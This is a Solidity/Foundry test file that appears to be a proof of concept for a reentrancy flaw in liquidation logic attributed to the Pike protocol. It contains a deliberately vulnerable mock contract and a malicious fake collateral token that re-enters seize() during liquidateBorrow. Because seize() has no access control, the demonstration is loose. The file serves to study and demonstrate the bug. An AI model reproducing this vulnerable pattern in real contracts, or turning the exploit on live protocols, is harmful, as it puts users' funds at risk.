// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

import "forge-std/Test.sol";

// ------------------------------
// Interface for malicious token
// ------------------------------
interface IPToken {
    function accrueInterest() external;
}

// ------------------------------
// Vulnerable PikePToken Contract
// ------------------------------
contract PikePToken {
    address public collateral;

    // 🧠 Vulnerable storage — will be corrupted
    mapping(address => uint256) public seizedBalance;

    function setCollateralToken(address _token) public {
        console.log("[0] setCollateralToken() called");
        collateral = _token;
    }

    function liquidateBorrow(address borrower, uint256 repayAmount, IPToken collateralToken) public {
        console.log("[1] liquidateBorrow() called");
        console.log("[2] Reentrancy starting via accrueInterest()...");
        collateralToken.accrueInterest(); // 🧨 Reentrancy happens here!
        console.log("[5] Back in liquidateBorrow(), now calling seize()");
        seize(address(collateral), address(collateral), 1);
        console.log("[8] liquidateBorrow() finished");
    }

    function seize(address from, address to, uint256 amount) public {
        console.log("[3/6] seize() called by", msg.sender);
        seizedBalance[to] += amount;
        console.log("[4/7] seizedBalance[%s] now: %s", to, seizedBalance[to]);
    }
}

// ------------------------------
// Malicious Fake Collateral Token
// ------------------------------
contract FakePToken is IPToken {
    PikePToken public target;

    constructor(address _target) {
        target = PikePToken(_target);
    }

    function accrueInterest() external override {
        console.log("[3] FakePToken.accrueInterest() triggered");
        target.seize(address(this), address(this), 1); // ⛏️ Reentrant call!
        console.log("[4] FakePToken.accrueInterest() completed");
    }
}

// ------------------------------
// Reentrancy Exploit Test
// ------------------------------
contract PikeReentrancyTest is Test {
    function test_ReentrancyLiquidation() public {
        console.log("=== Start Reentrancy PoC Test ===");

        // 🛠 Deploy PikePToken contract
        PikePToken pike = new PikePToken();

        // 🛠 Deploy malicious fake collateral
        FakePToken fakeCollateral = new FakePToken(address(pike));

        // ✅ Set the fake collateral into the PikePToken
        pike.setCollateralToken(address(fakeCollateral));

        // 🔥 Trigger the reentrant exploit via liquidation
        pike.liquidateBorrow(address(0xBEEF), 1 ether, IPToken(address(fakeCollateral)));

        // ✅ Final storage balance check
        uint256 finalBalance = pike.seizedBalance(address(fakeCollateral));
        console.log("[9] Final seizedBalance[attacker]:", finalBalance);

        // ✅ Assertion: if reentrancy worked, balance will be 2
        assertEq(finalBalance, 2, "Reentrancy did NOT work as expected");

        console.log("=== End Reentrancy PoC Test ===");
    }
}
